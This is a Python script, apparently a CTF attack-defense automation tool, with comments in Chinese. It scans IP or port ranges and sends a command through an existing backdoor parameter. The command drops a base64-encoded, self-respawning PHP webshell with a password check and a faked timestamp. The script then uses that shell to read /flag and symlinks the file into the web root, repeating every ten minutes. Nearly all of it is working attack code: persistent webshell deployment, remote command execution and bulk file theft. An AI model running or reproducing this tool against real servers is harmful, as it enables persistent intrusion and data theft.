import os
import time

import requests
import json
from jsonpath import jsonpath
import ipaddress

"""
        生成的文件 .conf.php,这个文件是一个不死马
        不死马内容为：<?php if(md5($_GET["pass"])=="a50b0e73373c3bac8bba82e8146948a4"){@eval($_GET[a]);} ?>
        pass:pwjcw
"""

class MyTools():
    headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"}
    shell_con="system('echo \"PD9waHAgCmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpzZXRfdGltZV9saW1pdCgwKTsKdW5saW5rKF9fRklMRV9fKTsKJGZpbGUgPSAnLi8uY29uZi5waHAnOwokY29kZSA9ICc8P3BocCBpZihtZDUoJF9HRVRbInBhc3MiXSk9PSJhNTBiMGU3MzM3M2MzYmFjOGJiYTgyZTgxNDY5NDhhNCIpe0BldmFsKCRfR0VUW2FdKTt9ICc7CndoaWxlICgxKXsKCWZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsKCXN5c3RlbSgndG91Y2ggLW0gLWQgIjIwMTctMTEtMTcgMTU6MjA6NTQiIC5jb25mLnBocCcpOwoJdXNsZWVwKDUwMCk7Cn0KPz4=\" | base64 -d > config2.php');"
    def __init__(self):
        self.param=input("请输入执行参数:")
        self.method=int(input("请输入请求方法的编号1:GET/2:PSOT :"))
        self.path=input("请输入后门地址如：/admin/config.php :")
        self.ip_method=int(input("请输入目标ip地址的方法,1 按网段生成,2 按端口生成:"))
        self.ip_con=[]
        self.flag=[]

    #A方法生成ip地址为，生成一个网段的ip
    def get_ip_A(self):
        print("[*] 正在生成ip地址")
        ip_range = input("请输入ip地址的范围如192.168.0.1-192.168.0.255:")
        ip_c=ip_range.split('-')
        start_ip=ipaddress.ip_address(ip_c[0])
        end_ip=ipaddress.ip_address(ip_c[1])
        for ip in range(int(start_ip),int(end_ip)+1):
            self.ip_con.append(ipaddress.ip_address(ip))    #如果需要知道端口号
    #B方法生成ip为，生成同一ip地址，但是端口号不同
    def get_ip_B(self):
        a = input("请输入指定ip地址：")
        b = input("请输入端口号范围如8001-8036:")
        b = list(map(int, b.split('-')))
        print(b)
        for i in range(b[0], b[1] + 1):
            self.ip_con.append(a + ":" + str(i))
    def get_current_directory(self,path_con):
        # 使用os.path.dirname()函数获取给定路径的当前目录
        current_directory = os.path.dirname(path_con)
        # 判断当前目录是否为空，如果为空则设置为根目录"/"
        if current_directory == '':
            current_directory = '/'
        return current_directory


    #上传不死马POST方法
    def UploadShell_A(self):
        print("[*] 正在上传不死马")
        for i in self.ip_con:
            url="http://{}{}".format(i,self.path)
            data={"{}".format(self.param):"{}".format(MyTools.shell_con)}
            try:
                res=requests.post(url,data=data,verify=False,headers=MyTools.headers,timeout=1).text
            except:
                print(url+"写入失败")
    #上传不死马GET方法
    def UploadShell_B(self):
        print("[*] 正在上传不死马")
        for i in self.ip_con:
            url="http://{}{}?{}={}".format(i,self.path,self.param,MyTools.shell_con)
            # print(url)
            try:
                res=requests.get(url,verify=False,headers=MyTools.headers,timeout=1)
            except:
                print(url+"写入失败")

    #生成不死马
    def Get_Shell(self):
        print("[*] 正在生成不死马")
        path=self.get_current_directory(self.path)+'/'
        for i in self.ip_con:
            # print(i)
            url="http://{}".format(i)+path+"config2.php"
            print(url)
            try:
                res=requests.get(url,timeout=1,verify=False,headers=MyTools.headers)
            except:
                pass
    #这个建议手动更改一下，改成一个比较隐蔽的目录
    def Create_Link(self):
        print("[*] 正在创建软连接")
        path = self.get_current_directory(self.path) + '/'
        for i in self.ip_con:
            url="http://"+i+path+".conf.php?pass=pwjcw&a=system('ln -s /flag /var/www/html/index.css');"
            res=requests.get(url,headers=MyTools.headers,verify=False)
    #通过shell的方式获取flag
    def GET_flagWithShell(self):
        print('[*] 正在获取flag')
        path = self.get_current_directory(self.path) + '/'
        for i in self.ip_con:
            url="http://"+i+path+'.conf.php?pass=pwjcw&a=system(\'cat /flag\');'
            flag=requests.get(url,headers=MyTools.headers,verify=False).text
            if len(flag)<50:
                self.flag.append(flag)
                print(flag)
            else:
                print('[-] {} shell获取flag失败'.format(i))
                MyTools.GET_FlagWithLinkI(self,i)  #shell方式获取flag失败后会通过软连接方式获取
    #通过软连接的方式获取flag
    def Get_flagWithLink(self):
        for i in  self.ip_con:
            url="http://"+i+"/index.css"
            flag=requests.get(url,headers=MyTools.headers,verify=False).text
            if len(flag)<50:
                self.flag.append(flag)
                print(flag)
            else:
                print('[-] {} 软连接获取flag失败'.format(i))
    #获取指定ip的软连接
    def GET_FlagWithLinkI(self,i):
        url = "http://" + i + "/index.css"
        flag = requests.get(url, headers=MyTools.headers, verify=False).text
        if len(flag) < 50:
            self.flag.append(flag)
            print(flag)
        else:
            print('[-] {} 软连接获取flag失败'.format(i))
    #去除flag中的换行
    def DeleteReturn(self):
        self.flag=[text.strip() for text in self.flag]
        print(self.flag)
if __name__ == '__main__':
    print("[*] 正在启动程序")
    tools=MyTools()
    if tools.ip_method==1:
        tools.get_ip_A()
    else:
        tools.get_ip_B()
    if tools.method==1:
       tools.UploadShell_B()
    else:
        tools.UploadShell_A()
    while True:
        tools.Get_Shell()
        tools.Create_Link()
        tools.GET_flagWithShell()
        tools.DeleteReturn()
        time.sleep(600)